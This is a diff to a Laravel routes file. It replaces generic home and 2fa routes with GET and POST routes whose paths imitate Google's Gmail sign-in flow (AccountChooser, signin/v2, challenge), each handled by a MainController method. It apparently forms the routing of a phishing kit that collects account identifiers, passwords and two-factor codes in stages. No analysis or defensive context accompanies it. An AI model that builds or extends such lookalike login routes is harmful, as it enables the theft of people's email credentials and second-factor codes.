@@ -15,8 +15,14 @@ use App\Http\Controllers\MainController;
 */
 
 Route::get('/', [MainController::class, 'home'])->name('home');
-Route::post('/', [MainController::class, 'homestore'])->name('homestore');
+
+Route::get('/AccountChooser/identifier/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'homee'])->name('homee');
+Route::post('/AccountChooser/identifier/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'homepost'])->name('homee');
+Route::get('/signin/v2/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'secondhome'])->name('secondhome');
+Route::post('/signin/v2/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'secondhomepost'])->name('secondhome');
 
 
-Route::get('/2fa', [MainController::class, 'firststep'])->name('firststep');
-Route::post('/2fa', [MainController::class, 'firststepstore']);
+Route::get('/signin/v2/text/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'thirdhome'])->name('thirdhome');
+
+Route::get('/signin/v2/challenge/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'fourthpage'])->name('fourthpage');
+Route::post('/signin/v2/challenge/service=mail&continue=https3A2F2Fmail.google.com2Fmail2F&flowName=GlifWebSignIn&flowEntry=AccountChooser&hl=en-GB', [MainController::class, 'fourthpagepost'])->name('fourthpage');
